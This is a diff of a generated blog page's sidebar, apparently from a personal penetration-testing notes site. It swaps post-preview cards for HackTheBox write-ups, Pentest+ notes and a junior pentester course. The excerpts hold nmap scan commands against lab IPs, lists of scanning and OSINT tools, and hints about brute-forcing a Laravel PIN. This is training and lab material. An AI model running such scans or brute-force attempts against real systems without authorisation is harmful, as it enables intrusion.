@@ -1549,14 +1765,6 @@ chsh common-password  cron lightdm-greeter other ppp samba sudo
 
 
 
-<!-- BS-toc.js will be loaded at medium priority -->
-<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
-
-<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
-  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
-  <nav id="toc" data-toggle="toc"></nav>
-</div>
-
 
     
   </div>
@@ -1684,59 +1892,59 @@ chsh common-password  cron lightdm-greeter other ppp samba sudo
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
   
 
   
@@ -1784,6 +1992,60 @@ chsh common-password  cron lightdm-greeter other ppp samba sudo
       
       
       <div class="card">
+        <a href="/posts/pentestPlus/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/timeago.js
+-->
+
+<em class="timeago small"
+    data-ts="1621308780"
+    
+    >
+  2021-05-18
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pentest+ notes</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Tools:
+
+cheetsheet
+https://highon.coffee/blog/penetration-testing-tools-cheat-sheet
+
+Scanners
+
+  Nikto
+  OpenVAS
+  sqlmap
+  Nessus
+  Nmap
+
+
+OSINT
+
+  WHOIS
+  Nslookup
+  FOCA
+  theHarvester
+  Shodan
+...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      
+      
+      <div class="card">
         <a href="/posts/htb-secret/">
           <div class="card-body">
             <!--
@@ -1808,15 +2070,13 @@ chsh common-password  cron lightdm-greeter other ppp samba sudo
 
 
                 nmap
-1
-2
 nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120
 nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120
 
 
 See 80, 3000 port run the same thing:
 
-  maybe 80 is a reverse...
+  maybe 80 is a reverse pro...
               </p>
             </div>
           </div>
@@ -1826,7 +2086,7 @@ See 80, 3000 port run the same thing:
       
       
       <div class="card">
-        <a href="/posts/htb-stacked/">
+        <a href="/posts/Jr-Penetration-Tester/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1834,13 +2094,13 @@ See 80, 3000 port run the same thing:
 -->
 
 <em class="timeago small"
-    data-ts="1648524780"
+    data-ts="1643299200"
     
     >
-  2022-03-29
+  2022-01-28
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>htb stacked</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Jr Penetrarion Test</h3>
             <div class="text-muted small">
               <p>
                 
@@ -1849,56 +2109,12 @@ See 80, 3000 port run the same thing:
 
 
 
-                recon
+                Content Discovery
 
-nmap
-1
-2
-nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112
-nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
-
-
-  22/tcp   open  ssh; 80/tcp   open  http; 2376/tcp ope...
-              </p>
-            </div>
-          </div>
-        </a>
-      </div>
-    
-      
-      
-      <div class="card">
-        <a href="/posts/htb-altered/">
-          <div class="card-body">
-            <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/timeago.js
--->
-
-<em class="timeago small"
-    data-ts="1648870380"
-    
-    >
-  2022-04-02
-</em>
-
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>htb altered</h3>
-            <div class="text-muted small">
-              <p>
-                
-
-
-
-
-
-                Know it`s an php lavarel application behind nginx.
-
-Brute force Laravel application pin
-
-try type juggling
-
-  change content type to application/json
-  application/x-www-form-urlencoded, body is na...
+  Wappalyzer (https://www.wappalyzer.com/)
+  The Wayback Machine (https://archive.org/web/)
+  Automated Discovery https://github.com/danielmiessler/SecLists
+  ffuf,  “Fuzz Faster...
               </p>
             </div>
           </div>
@@ -1917,16 +2133,16 @@ try type juggling
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <a href="/posts/text-and-typography/" class="btn btn-outline-primary"
+  <a href="/posts/htb-secret/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>Text and Typography</p>
+    <p>htb secret</p>
   </a>
   
 
   
-  <a href="/posts/Algorithm/" class="btn btn-outline-primary"
+  <a href="/posts/Jr-Penetration-Tester/" class="btn btn-outline-primary"
     prompt="Newer">
-    <p>Algorithm</p>
+    <p>Jr Penetrarion Test</p>
   </a>
   
 
